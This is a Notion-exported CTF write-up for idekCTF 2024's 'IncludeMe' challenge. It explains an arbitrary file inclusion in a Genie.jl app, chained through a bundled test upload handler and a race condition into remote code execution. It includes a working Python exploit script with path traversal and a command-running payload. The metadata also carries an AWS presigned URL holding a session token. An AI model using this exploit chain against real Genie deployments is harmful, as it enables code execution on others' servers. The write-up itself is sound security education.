---
id: 476adce3-c249-4a2d-ad88-ea823a5c99a1
title: Arbitrary File Inclusion Leading to RCE in Genie.jl - IncludeMe [idekCTF 2024]
created_time: 2024-08-19T00:24:00.000Z
last_edited_time: 2024-09-28T00:27:00.000Z
cover_image: ./imgs/images_CYPDSAFZ
icon_emoji: 🏎️
categories: []
verification:
  state: unverified
  verified_by: null
  date: null
page: Arbitrary File Inclusion Leading to RCE in Genie.jl - IncludeMe [idekCTF 2024]
owner:
  - object: user
    id: ee7aeeeb-cd0d-4cbb-9e7e-109320ff16fa
    name: Dimas
    avatar_url: >-
      https://s3-us-west-2.amazonaws.com/public.notion-static.com/fab4bcf0-36ea-4bd6-8847-f18b157387da/92920739.png
    type: person
    person:
      email: dimasmaulana0305@gmail.com
_thumbnail: ./imgs/images_CYPDSAFZ

---

In idekCTF 2024, I played with the **P1G SEKAI** team and secured 1st place out of 1,068 teams! I solved a challenge named "Included me" and got the first blood on that challenge.

# Challenge Description

another minimalist, frontend-less, challenge because i'm bad at writing server-side challenges

[image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/709a0b78-7ae2-4171-930b-e98c753c8621/includeme.tar.gz?X-Amz-Algorithm=AWS4-HMAC-SHA256\&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD\&X-Amz-Credential=ASIAZI2LB4662623BKM6%2F20250522%2Fus-west-2%2Fs3%2Faws4_request\&X-Amz-Date=20250522T210321Z\&X-Amz-Expires=3600\&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECUaCXVzLXdlc3QtMiJHMEUCIQCpiF26yD97rMeJfYw8FtaEjX0P35WJ8HD56pQZQ3ZZqgIgI3tRYAJhNo38PVwwGQDJOCHXTyS6bco5%2B7S4ZkFCZdcqiAQI3v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDDI6eqCPP8kMeK2tPyrcA87gHuSeJRMWY63EZpcGlrgs6Y42K5Mulvfp3n08vpS8YAevTPHIJXQ07JrxrBnin1T5mfuOgQP6iF5Nx54NNq9FYsAC4AFZSY8FPoj6VG2N8wdilyUx3dY7bPxgvH0qLmJgfcJpKhVqW%2Bpru%2BK9exPnCEQ%2Fb0vS3yVLhAsjsJ%2BLn5%2Bks4ORmwrePJdDCmYeplq%2Fppt8RtWdbQuOSjoO7bIt%2BUO9sPMUeH%2FH7MeDIY6xWpX2G3sYJcWWwrx2Ks2U9Ed9%2BTUQXQkkJVXlGkeRfSUYDmMxBnTsyUa5idHfO7rhalkZJQ6lz8IsUGwf9XKZeQSCTvUjrrU%2FWXpM1cdcRyTXb8zy2TMPxJ2dP3OROeSmulc4PUg10x7zAjVg5tnu7hwriK7XiEjXd8dAE5kGf4Dh3%2B0qm3C3r%2FO9veDUo9olrZWBgiVqupRDp53NlYofq5dnC8O98MyG3T4ZbH%2FXcpYd3TmXR3evY8Yiqr5H%2FOm%2B6E6SbOxcKp8jNhSduT07BAGHJJJ4FqDfiJGUw0fZdfkIrMhsTKkir0vOaE%2BoW3FItmXLhvhV9ECqK%2F23yufaP%2BKV0LmxImeU7v41G95dEi3ieMxCm8FCj0rXcxESfCUAesMiNqxHIN0TtiPuMI2TvsEGOqUBp%2FlP9Uo1rvBINg8Ob60vGj9wAVFvL9FZVVILQLpXXe6btnNZHKAG5SFqRD5vfIV%2BrFKOmbQ3ipKpruV%2FLpmsxo5TZartL4YSLMLweN45yEkUVCFfIq9ntLF48BvVyMbgtfVqDCo%2FaWs7ez8sEY4s%2BROBEQ%2FsFhngk6Mua6XWxdc0WBkAEKdi7Rf%2FmRFsVejxgPdJtCcGNi0aCh9wgjXQ3XsHnwAU\&X-Amz-Signature=e1a50f663d0ea2b9738731b511d1ae6f69d2486ee9d05117548af49c3e971b0a\&X-Amz-SignedHeaders=host\&x-id=GetObject)

# How to Solve

The goal of this challenge was to achieve Remote Code Execution (RCE) and capture the flag. The program was vulnerable to arbitrary file inclusion here:

```julia
using Genie, Genie.Requests, Pkg

Pkg.activate(".")

index() = include(params(:page, "example.jl"))

route("/", index)

up(1337, "0.0.0.0", async = false)
```

We could include arbitrary files into the application, altering its flow. I discovered that we could include a test case from this Genie.jl repository:

> [![image](./imgs/b322ed80-bc5a-11e9-807a-9b53749c40ef_ftYlQyUC) **Genie.jl/test/fileuploads/test.jl at 509886d61a75d74bcbd45db1f77230abd4cd11a8 · GenieFramework/Genie.jl**](https://github.com/GenieFramework/Genie.jl/blob/509886d61a75d74bcbd45db1f77230abd4cd11a8/test/fileuploads/test.jl#L14)\
> 🧞The highly productive Julia web framework. Contribute to GenieFramework/Genie.jl development by creating an account on GitHub.\
> <https://github.com/GenieFramework/Genie.jl/blob/509886d61a75d74bcbd45db1f77230abd4cd11a8/test/fileuploads/test.jl#L14>

This test case essentially exposes a file upload vulnerability, allowing us to upload arbitrary files into Genie. However, after including that file, the program’s flow would change, preventing us from doing it a second time… or would it? The solution is yes, we can include it again if we’re fast enough to include `app.jl` right after uploading the file. This requires a race condition. Here's my solution script:

```python
import httpx
import asyncio

URL = "http://localhost:1337"
# URL = "https://includeme-295e03fffda9795f.instancer.idek.team/"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url, timeout=100)
    def page(self, page):
        return self.c.get("/", params={"page": page})
    def upload(self, fileupload):
        return self.c.post("/", files={"fileupload": ("x.jl", fileupload)})
class API(BaseAPI):
    ...

async def main():
    api = API()
    ress = []
    res1 = api.page("../home/ctf/.julia/packages/Genie/yQwwj/test/fileuploads/test.jl")
    ress.append(res1)
    for i in range(10):
        res2 = api.upload("""
read(`cat flag.txt`, String)
""")
        for j in range(10):
            res3 = api.page("app.jl")
            ress.append(res3)
        ress.extend([res1, res2])
    ress = await asyncio.gather(*ress)
    for res in ress:
        print(res.text)


if __name__ == "__main__":
    asyncio.run(main())

```

Next, visit <http://localhost:1337/?page=x.jl> to retrieve the flag.

![](./imgs/image_2FRbeU5K.png)
